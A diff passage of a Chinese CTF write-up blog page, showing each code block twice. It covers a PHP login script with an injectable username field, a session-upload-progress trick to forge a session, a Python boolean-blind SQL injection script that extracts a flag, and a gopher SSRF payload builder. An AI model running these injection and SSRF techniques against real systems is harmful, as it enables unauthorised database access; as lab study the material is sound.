class="title function_ invoke__">OR</span> (<span class="variable">$con</span>-&gt;<span class="title function_ invoke__">close</span>() AND <span class="keyword">die</span>(<span class="string">&quot;Error!&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
 
 <p>login.php</p>
-<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>) AND <span class="keyword">die</span>(<span class="string">&quot;Direct access on this script is not allowed!&quot;</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;db.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//没有太多限制，除了session</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&#x27;SELECT `username`,`password` FROM `ptbctf`.`ptbctf` where `username`=&quot;&#x27;</span> . <span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>] . <span class="string">&#x27;&quot; and password=&quot;&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]) . <span class="string">&#x27;&quot;;&#x27;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$con</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">auth</span>(<span class="params"><span class="variable">$user</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$user</span>;</span><br><span class="line">    <span class="keyword">return</span> True;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span> AND <span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>() AND <span class="variable">$con</span>-&gt;<span class="title function_ invoke__">close</span>() AND <span class="title function_ invoke__">auth</span>(<span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>]) AND <span class="keyword">die</span>(<span class="string">&#x27;&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0; url=?p=home&quot; /&gt;&#x27;</span>)) <span class="title function_ invoke__">OR</span> (<span class="variable">$con</span>-&gt;<span class="title function_ invoke__">close</span>() AND <span class="keyword">die</span>(<span class="string">&#x27;Try again!&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>) AND <span class="keyword">die</span>(<span class="string">&quot;Direct access on this script is not allowed!&quot;</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;db.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//没有太多限制，除了session</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&#x27;SELECT `username`,`password` FROM `ptbctf`.`ptbctf` where `username`=&quot;&#x27;</span> . <span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>] . <span class="string">&#x27;&quot; and password=&quot;&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]) . <span class="string">&#x27;&quot;;&#x27;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$con</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">auth</span>(<span class="params"><span class="variable">$user</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$user</span>;</span><br><span class="line">    <span class="keyword">return</span> True;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span> AND <span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>() AND <span class="variable">$con</span>-&gt;<span class="title function_ invoke__">close</span>() AND <span class="title function_ invoke__">auth</span>(<span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>]) AND <span class="keyword">die</span>(<span class="string">&#x27;&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0; url=?p=home&quot; /&gt;&#x27;</span>)) <span class="title function_ invoke__">OR</span> (<span class="variable">$con</span>-&gt;<span class="title function_ invoke__">close</span>() AND <span class="keyword">die</span>(<span class="string">&#x27;Try again!&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
 
 <p>注入点基本可以确定是在login.php的username</p>
 <h5 id="2-在login-php中绕过-isset-SESSION-，伪造session"><a href="#2-在login-php中绕过-isset-SESSION-，伪造session" class="headerlink" title="2. 在login.php中绕过!isset($_SESSION)，伪造session"></a>2. 在login.php中绕过<code>!isset($_SESSION)</code>，伪造session</h5><p>这里的session重点不在于内容，在于有没有session</p>
@@ -645,11 +552,11 @@
                      data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202401231812477.png"
                       alt="image-20240123181251810"
                 ></p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://7e2717b5-816f-4863-a72b-0214afb27184.node5.buuoj.cn:81/templates/login.php&quot;</span></span><br><span class="line"></span><br><span class="line">files = &#123;<span class="string">&quot;file&quot;</span>:<span class="string">&quot;123&quot;</span>&#125;</span><br><span class="line">a = requests.post(</span><br><span class="line">    url = url,</span><br><span class="line">    files=files,</span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>:<span class="string">&quot;123&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    cookies=&#123;<span class="string">&quot;PHPSESSID&quot;</span>:<span class="string">&quot;test&quot;</span>&#125;,</span><br><span class="line">    params=&#123;</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;123&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;123&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    proxies=&#123;<span class="string">&#x27;http&#x27;</span>: <span class="string">&quot;http://127.0.0.1:8080&quot;</span>&#125;</span><br><span class="line">)</span><br><span class="line"><span class="built_in">print</span>(a.text)</span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://7e2717b5-816f-4863-a72b-0214afb27184.node5.buuoj.cn:81/templates/login.php&quot;</span></span><br><span class="line"></span><br><span class="line">files = &#123;<span class="string">&quot;file&quot;</span>:<span class="string">&quot;123&quot;</span>&#125;</span><br><span class="line">a = requests.post(</span><br><span class="line">    url = url,</span><br><span class="line">    files=files,</span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>:<span class="string">&quot;123&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    cookies=&#123;<span class="string">&quot;PHPSESSID&quot;</span>:<span class="string">&quot;test&quot;</span>&#125;,</span><br><span class="line">    params=&#123;</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;123&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;123&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    proxies=&#123;<span class="string">&#x27;http&#x27;</span>: <span class="string">&quot;http://127.0.0.1:8080&quot;</span>&#125;</span><br><span class="line">)</span><br><span class="line"><span class="built_in">print</span>(a.text)</span><br></pre></td></tr></table></figure></div>
 
 <p>成功绕过</p>
 <h5 id="3-SQL注入"><a href="#3-SQL注入" class="headerlink" title="3.SQL注入"></a>3.SQL注入</h5><p>利用两个die进行布尔盲注</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://7449720f-77b1-4a05-b030-5896b3d31081.node5.buuoj.cn:81/templates/login.php&quot;</span></span><br><span class="line">cookie = &#123;<span class="string">&quot;PHPSESSID&quot;</span>:<span class="string">&quot;test&quot;</span>&#125;</span><br><span class="line">files = &#123;<span class="string">&quot;file&quot;</span>:<span class="string">&quot;123&quot;</span>&#125;</span><br><span class="line">data = &#123;<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>:<span class="string">&quot;123&quot;</span>&#125;</span><br><span class="line">proxies = &#123;<span class="string">&#x27;http&#x27;</span>:<span class="string">&quot;http://127.0.0.1:8080&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 数据库</span></span><br><span class="line"><span class="comment"># 6 ptbctf</span></span><br><span class="line"><span class="comment"># db=&quot;&quot;</span></span><br><span class="line"><span class="comment"># for i in range(1,7):</span></span><br><span class="line"><span class="comment">#     for j in range(32,127):</span></span><br><span class="line"><span class="comment">#         name = &#x27;1\&quot; or (ascii(substr((select database()),&#123;&#125;,1))=&#123;&#125;)#&#x27;.format(i,j)</span></span><br><span class="line"><span class="comment">#         a = requests.post(</span></span><br><span class="line"><span class="comment">#             url = url,</span></span><br><span class="line"><span class="comment">#             files=files,</span></span><br><span class="line"><span class="comment">#             data=&#123;</span></span><br><span class="line"><span class="comment">#                 &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;:&quot;123&quot;</span></span><br><span class="line"><span class="comment">#             &#125;,</span></span><br><span class="line"><span class="comment">#             cookies=cookie,</span></span><br><span class="line"><span class="comment">#             params=&#123;</span></span><br><span class="line"><span class="comment">#                 &#x27;username&#x27;:name,</span></span><br><span class="line"><span class="comment">#                 &#x27;password&#x27;:&#x27;123&#x27;</span></span><br><span class="line"><span class="comment">#             &#125;,</span></span><br><span class="line"><span class="comment">#             proxies=proxies</span></span><br><span class="line"><span class="comment">#         )</span></span><br><span class="line"><span class="comment">#         if a.text == &quot;&lt;meta http-equiv=\&quot;refresh\&quot; content=\&quot;0; url=?p=home\&quot; /&gt;&quot;:</span></span><br><span class="line"><span class="comment">#             db = db+chr(j)</span></span><br><span class="line"><span class="comment">#             break</span></span><br><span class="line"><span class="comment"># print(db)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 表</span></span><br><span class="line"><span class="comment"># 2</span></span><br><span class="line"><span class="comment"># 8 flag_tbl</span></span><br><span class="line"><span class="comment"># 6 ptbctf</span></span><br><span class="line"><span class="comment"># table1=&quot;&quot;</span></span><br><span class="line"><span class="comment"># for i in range(1,7):</span></span><br><span class="line"><span class="comment">#     for j in range(32,127):</span></span><br><span class="line"><span class="comment">#         name=&#x27;1\&quot; or ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),&#123;&#125;,1))=&#123;&#125;#&#x27;.format(i,j)</span></span><br><span class="line"><span class="comment">#         a = requests.post(url=url,files=files,data=data,cookies=cookie,proxies=proxies,params=&#123;&#x27;username&#x27;:name,&#x27;password&#x27;:&#x27;123&#x27;&#125;)</span></span><br><span class="line"><span class="comment">#         if a.text == &quot;&lt;meta http-equiv=\&quot;refresh\&quot; content=\&quot;0; url=?p=home\&quot; /&gt;&quot;:</span></span><br><span class="line"><span class="comment">#             table1+=chr(j)</span></span><br><span class="line"><span class="comment">#             break</span></span><br><span class="line"><span class="comment"># print(table1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 表1字段</span></span><br><span class="line"><span class="comment"># secret</span></span><br><span class="line"><span class="comment"># column=&quot;&quot;</span></span><br><span class="line"><span class="comment"># for i in range(1,10):</span></span><br><span class="line"><span class="comment">#     for j in range(32,127):</span></span><br><span class="line"><span class="comment">#         name=&#x27;1\&quot; or ascii(substr((select column_name from information_schema.columns where table_name=\&#x27;flag_tbl\&#x27;),&#123;&#125;,1))=&#123;&#125;#&#x27;.format(i,j)</span></span><br><span class="line"><span class="comment">#         a = requests.post(url=url,cookies=cookie,files=files,data=data,proxies=proxies,params=&#123;&#x27;username&#x27;:name,&#x27;password&#x27;:&#x27;123&#x27;&#125;)</span></span><br><span class="line"><span class="comment">#         if a.text == &quot;&lt;meta http-equiv=\&quot;refresh\&quot; content=\&quot;0; url=?p=home\&quot; /&gt;&quot;:</span></span><br><span class="line"><span class="comment">#             column+=chr(j)</span></span><br><span class="line"><span class="comment">#             break</span></span><br><span class="line"><span class="comment"># print(column)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 内容</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">        name=<span class="string">&#x27;1\&quot; or ascii(substr((select secret from flag_tbl),&#123;&#125;,1))=&#123;&#125;#&#x27;</span>.<span class="built_in">format</span>(i,j)</span><br><span class="line">        a = requests.post(url=url,cookies=cookie,files=files,data=data,proxies=proxies,params=&#123;<span class="string">&#x27;username&#x27;</span>:name,<span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;123&#x27;</span>&#125;)</span><br><span class="line">        <span class="keyword">if</span> a.text == <span class="string">&quot;&lt;meta http-equiv=\&quot;refresh\&quot; content=\&quot;0; url=?p=home\&quot; /&gt;&quot;</span>:</span><br><span class="line">            flag += <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># flag&#123;7e4c1473-69f2-4bf2-a5e5-078637ef5016&#125;</span></span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://7449720f-77b1-4a05-b030-5896b3d31081.node5.buuoj.cn:81/templates/login.php&quot;</span></span><br><span class="line">cookie = &#123;<span class="string">&quot;PHPSESSID&quot;</span>:<span class="string">&quot;test&quot;</span>&#125;</span><br><span class="line">files = &#123;<span class="string">&quot;file&quot;</span>:<span class="string">&quot;123&quot;</span>&#125;</span><br><span class="line">data = &#123;<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>:<span class="string">&quot;123&quot;</span>&#125;</span><br><span class="line">proxies = &#123;<span class="string">&#x27;http&#x27;</span>:<span class="string">&quot;http://127.0.0.1:8080&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 数据库</span></span><br><span class="line"><span class="comment"># 6 ptbctf</span></span><br><span class="line"><span class="comment"># db=&quot;&quot;</span></span><br><span class="line"><span class="comment"># for i in range(1,7):</span></span><br><span class="line"><span class="comment">#     for j in range(32,127):</span></span><br><span class="line"><span class="comment">#         name = &#x27;1\&quot; or (ascii(substr((select database()),&#123;&#125;,1))=&#123;&#125;)#&#x27;.format(i,j)</span></span><br><span class="line"><span class="comment">#         a = requests.post(</span></span><br><span class="line"><span class="comment">#             url = url,</span></span><br><span class="line"><span class="comment">#             files=files,</span></span><br><span class="line"><span class="comment">#             data=&#123;</span></span><br><span class="line"><span class="comment">#                 &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;:&quot;123&quot;</span></span><br><span class="line"><span class="comment">#             &#125;,</span></span><br><span class="line"><span class="comment">#             cookies=cookie,</span></span><br><span class="line"><span class="comment">#             params=&#123;</span></span><br><span class="line"><span class="comment">#                 &#x27;username&#x27;:name,</span></span><br><span class="line"><span class="comment">#                 &#x27;password&#x27;:&#x27;123&#x27;</span></span><br><span class="line"><span class="comment">#             &#125;,</span></span><br><span class="line"><span class="comment">#             proxies=proxies</span></span><br><span class="line"><span class="comment">#         )</span></span><br><span class="line"><span class="comment">#         if a.text == &quot;&lt;meta http-equiv=\&quot;refresh\&quot; content=\&quot;0; url=?p=home\&quot; /&gt;&quot;:</span></span><br><span class="line"><span class="comment">#             db = db+chr(j)</span></span><br><span class="line"><span class="comment">#             break</span></span><br><span class="line"><span class="comment"># print(db)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 表</span></span><br><span class="line"><span class="comment"># 2</span></span><br><span class="line"><span class="comment"># 8 flag_tbl</span></span><br><span class="line"><span class="comment"># 6 ptbctf</span></span><br><span class="line"><span class="comment"># table1=&quot;&quot;</span></span><br><span class="line"><span class="comment"># for i in range(1,7):</span></span><br><span class="line"><span class="comment">#     for j in range(32,127):</span></span><br><span class="line"><span class="comment">#         name=&#x27;1\&quot; or ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),&#123;&#125;,1))=&#123;&#125;#&#x27;.format(i,j)</span></span><br><span class="line"><span class="comment">#         a = requests.post(url=url,files=files,data=data,cookies=cookie,proxies=proxies,params=&#123;&#x27;username&#x27;:name,&#x27;password&#x27;:&#x27;123&#x27;&#125;)</span></span><br><span class="line"><span class="comment">#         if a.text == &quot;&lt;meta http-equiv=\&quot;refresh\&quot; content=\&quot;0; url=?p=home\&quot; /&gt;&quot;:</span></span><br><span class="line"><span class="comment">#             table1+=chr(j)</span></span><br><span class="line"><span class="comment">#             break</span></span><br><span class="line"><span class="comment"># print(table1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 表1字段</span></span><br><span class="line"><span class="comment"># secret</span></span><br><span class="line"><span class="comment"># column=&quot;&quot;</span></span><br><span class="line"><span class="comment"># for i in range(1,10):</span></span><br><span class="line"><span class="comment">#     for j in range(32,127):</span></span><br><span class="line"><span class="comment">#         name=&#x27;1\&quot; or ascii(substr((select column_name from information_schema.columns where table_name=\&#x27;flag_tbl\&#x27;),&#123;&#125;,1))=&#123;&#125;#&#x27;.format(i,j)</span></span><br><span class="line"><span class="comment">#         a = requests.post(url=url,cookies=cookie,files=files,data=data,proxies=proxies,params=&#123;&#x27;username&#x27;:name,&#x27;password&#x27;:&#x27;123&#x27;&#125;)</span></span><br><span class="line"><span class="comment">#         if a.text == &quot;&lt;meta http-equiv=\&quot;refresh\&quot; content=\&quot;0; url=?p=home\&quot; /&gt;&quot;:</span></span><br><span class="line"><span class="comment">#             column+=chr(j)</span></span><br><span class="line"><span class="comment">#             break</span></span><br><span class="line"><span class="comment"># print(column)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 内容</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">        name=<span class="string">&#x27;1\&quot; or ascii(substr((select secret from flag_tbl),&#123;&#125;,1))=&#123;&#125;#&#x27;</span>.<span class="built_in">format</span>(i,j)</span><br><span class="line">        a = requests.post(url=url,cookies=cookie,files=files,data=data,proxies=proxies,params=&#123;<span class="string">&#x27;username&#x27;</span>:name,<span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;123&#x27;</span>&#125;)</span><br><span class="line">        <span class="keyword">if</span> a.text == <span class="string">&quot;&lt;meta http-equiv=\&quot;refresh\&quot; content=\&quot;0; url=?p=home\&quot; /&gt;&quot;</span>:</span><br><span class="line">            flag += <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># flag&#123;7e4c1473-69f2-4bf2-a5e5-078637ef5016&#125;</span></span><br></pre></td></tr></table></figure></div>
 
 <hr>
 <h2 id="very-easy-sql"><a href="#very-easy-sql" class="headerlink" title="very_easy_sql"></a>very_easy_sql</h2><p>SSRF+SQL</p>
@@ -674,11 +581,11 @@
 <p>GET请求:<br>构造HTTP数据包,URL编码、替换回车换行为%0d%0a，HTTP包最后加%0d%0a代表消息结束</p>
 <p>POST请求<br>POST与GET传参的区别：它有4个参数为必要参数<br>需要传递Content-Type,Content-Length,host,post的参数<br>Content-Length和POST的参数长度必须一致</p>
 </blockquote>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">content=<span class="string">&quot;uname=admin&amp;passwd=admin&quot;</span>	<span class="comment"># 猜猜猜</span></span><br><span class="line">content_length=<span class="built_in">len</span>(content)</span><br><span class="line">payload=\</span><br><span class="line"><span class="string">&quot;&quot;&quot;POST / HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 61.147.171.105:61245</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0</span></span><br><span class="line"><span class="string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span></span><br><span class="line"><span class="string">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">Content-Length: &#123;&#125;</span></span><br><span class="line"><span class="string">Origin: http://61.147.171.105:61245</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Referer: http://61.147.171.105:61245/</span></span><br><span class="line"><span class="string">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#123;&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>.<span class="built_in">format</span>(content_length,content)</span><br><span class="line"></span><br><span class="line">temp = urllib.parse.quote(payload)   <span class="comment"># 对特殊字符进行编码</span></span><br><span class="line">new = temp.replace(<span class="string">&#x27;%0A&#x27;</span>,<span class="string">&#x27;%0D%0A&#x27;</span>)</span><br><span class="line">result = <span class="string">&#x27;gopher://127.0.0.1:80/&#x27;</span>+<span class="string">&#x27;_&#x27;</span>+new   <span class="comment"># gopher会将第一个字符吞噬，所以加个下划线</span></span><br><span class="line">result = urllib.parse.quote(result)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">content=<span class="string">&quot;uname=admin&amp;passwd=admin&quot;</span>	<span class="comment"># 猜猜猜</span></span><br><span class="line">content_length=<span class="built_in">len</span>(content)</span><br><span class="line">payload=\</span><br><span class="line"><span class="string">&quot;&quot;&quot;POST / HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 61.147.171.105:61245</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0</span></span><br><span 